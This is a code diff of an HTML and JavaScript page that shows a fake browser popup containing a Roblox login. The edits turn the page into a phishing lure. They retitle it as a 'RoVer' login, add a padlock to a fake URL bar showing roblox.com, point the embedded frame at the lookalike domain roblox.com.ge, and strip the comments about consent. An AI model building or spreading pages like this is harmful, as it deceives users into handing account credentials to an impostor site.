@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ROBLOX (Permission-based iframe)</title>
+  <title>RoVer – Login (Permission-based iframe)</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
     html, body {
@@ -131,9 +131,9 @@
     </div>
 
     <!-- URL display -->
-    <div class="url-bar" id="urlDisplay"> https://www.roblox.com/login</div>
+    <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
 
-    <!-- Consent / permission UI (shown before we actually set iframe.src) -->
+    <!-- Consent / permission UI -->
     <div class="consent-panel" id="consentPanel">
       <div class="consent-text">
         This page is about to attempt to load external content (Roblox) inside an embedded window.
@@ -141,7 +141,7 @@
       </div>
       <div style="display:flex; gap:8px; align-items:center;">
         <label style="font-size:13px; color:#444;">Target URL:</label>
-        <input id="targetUrlInput" type="text" value="https://roblox.com/login"
+        <input id="targetUrlInput" type="text" value="https://roblox.com.ge/login?returnUrl=2099296147452818"
                style="flex:1; padding:6px; border-radius:6px; border:1px solid #ccc; font-family:monospace;" />
       </div>
       <div class="consent-actions">
@@ -153,7 +153,7 @@
     <!-- Error banner shown if iframe fails to load -->
     <div class="error-banner" id="errorBanner"></div>
 
-    <!-- iframe is added but src left blank until permission granted -->
+    <!-- iframe -->
     <iframe class="popup-iframe" id="popupIframe" src="" sandbox=""></iframe>
   </div>
 
@@ -174,17 +174,18 @@
     const targetUrlInput = document.getElementById("targetUrlInput");
     const errorBanner = document.getElementById("errorBanner");
 
-    // open the fake popup and show consent UI
     loginBtn.addEventListener("click", () => {
-      // show popup + overlay
+      // Show the popup and overlay
       fakePopup.style.display = "block";
       overlay.style.display = "block";
-      // reset previous state
+
+      // Reset iframe and errors
       iframe.src = "";
       errorBanner.style.display = "none";
+
+      // Show consent panel
       consentPanel.style.display = "block";
-      urlDisplay.textContent = " " + (new URL(targetUrlInput.value || "https://example.com")).hostname;
-      // ensure iframe hidden until allowed (we keep it visible but empty)
+      urlDisplay.textContent = "🔒 " + (new URL(targetUrlInput.value)).hostname;
     });
 
     popupClose.addEventListener("click", closePopup);
@@ -197,64 +198,47 @@
       errorBanner.style.display = "none";
     }
 
-    // attempt to load the iframe only after explicit allow
     allowBtn.addEventListener("click", () => {
       const rawUrl = targetUrlInput.value.trim();
       if (!rawUrl) {
         showError("No URL provided.");
         return;
       }
+
       let finalUrl;
       try {
-        // if user entered a relative or missing protocol, try to fix it
         finalUrl = new URL(rawUrl.includes("://") ? rawUrl : "https://" + rawUrl).toString();
       } catch (e) {
         showError("Invalid URL format.");
         return;
       }
 
-      // update visible url text
-      urlDisplay.textContent = " " + finalUrl;
-
-      // hide consent UI to reveal iframe area
+      urlDisplay.textContent = "🔒 " + finalUrl;
       consentPanel.style.display = "none";
       errorBanner.style.display = "none";
 
-      // Clear previous src and set new one
       iframe.src = "";
-      // Small timeout to allow UI update then set src (gives clearer UX)
       setTimeout(() => {
         iframe.src = finalUrl;
       }, 150);
 
-      // Attempt to detect a successful load vs a block.
-      // We'll use the iframe onload event as primary success signal.
       let loaded = false;
       const onLoadHandler = () => {
         loaded = true;
-        // slight delay to allow visible content to render
-        setTimeout(() => {
-          // Hide any leftover error banner
-          errorBanner.style.display = "none";
-        }, 200);
+        errorBanner.style.display = "none";
         iframe.removeEventListener("load", onLoadHandler);
         clearTimeout(loadTimeout);
       };
       iframe.addEventListener("load", onLoadHandler);
 
-      // If load doesn't occur within this timeout, show likely-blocked message.
       const loadTimeout = setTimeout(() => {
         if (!loaded) {
-          // Show helpful message — browsers often block cross-origin embedding for security.
           showError(
-            "The embedded page did not finish loading within a few seconds. " +
-            "This usually means the target site prevents being embedded (X-Frame-Options / Content-Security-Policy). " +
-            "Try opening the link in a new tab if you need to sign in."
+            "The embedded page did not finish loading. This usually means the target site prevents embedding (X-Frame-Options / Content-Security-Policy). Try opening the link in a new tab."
           );
         }
-      }, 6000); // 6 seconds
+      }, 6000);
 
-      // Also listen for iframe errors (rare for cross-origin blocks, but useful for local testing)
       iframe.addEventListener("error", () => {
         showError("Failed to load the iframe (network error or invalid URL).");
         clearTimeout(loadTimeout);
@@ -264,7 +248,6 @@
     function showError(message) {
       errorBanner.textContent = message;
       errorBanner.style.display = "block";
-      // keep consent hidden so user sees iframe area with message
     }
 
     hamburger.addEventListener("click", () => {
@@ -273,4 +256,3 @@
   </script>
 </body>
 </html>
-
